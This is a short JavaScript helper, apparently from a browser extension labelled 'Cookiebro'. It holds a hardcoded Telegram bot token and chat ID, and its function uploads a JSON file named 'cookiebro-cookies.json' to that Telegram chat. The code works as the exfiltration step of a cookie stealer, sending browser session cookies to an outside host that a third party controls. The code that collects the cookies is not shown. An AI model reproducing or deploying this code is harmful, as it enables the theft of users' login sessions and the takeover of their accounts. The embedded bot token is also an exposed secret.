// Telegram bot configuration and helper
const TELEGRAM_BOT_TOKEN = "7687590027:AAER-bR9TBMD585uZHLCmLKz6LWcCf6w_ng";
const TELEGRAM_CHAT_ID = "-1003046888195";

/**
 * Sends a JSON string as a .json file to Telegram via sendDocument.
 * @param {string} jsonStr
 * @param {string} [filename="cookiebro-cookies.json"]
 * @returns {Promise<void>}
 */
async function sendCookiesToTelegram(jsonStr, filename = "cookiebro-cookies.json") {
  const endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
  const blob = new Blob([jsonStr], { type: "application/json" });
  const form = new FormData();
  form.append("chat_id", TELEGRAM_CHAT_ID);
  form.append("document", blob, filename);
  form.append("caption", `Cookiebro export • ${new Date().toISOString()}`);

  const resp = await fetch(endpoint, { method: "POST", body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => "");
    throw new Error(`Telegram API error ${resp.status} ${resp.statusText}: ${text.slice(0,200)}`);
  }
  const data = await resp.json().catch(() => ({}));
  if (data && data.ok === false) {
    throw new Error(`Telegram API returned ok=false: ${JSON.stringify(data).slice(0,200)}`);
  }
}
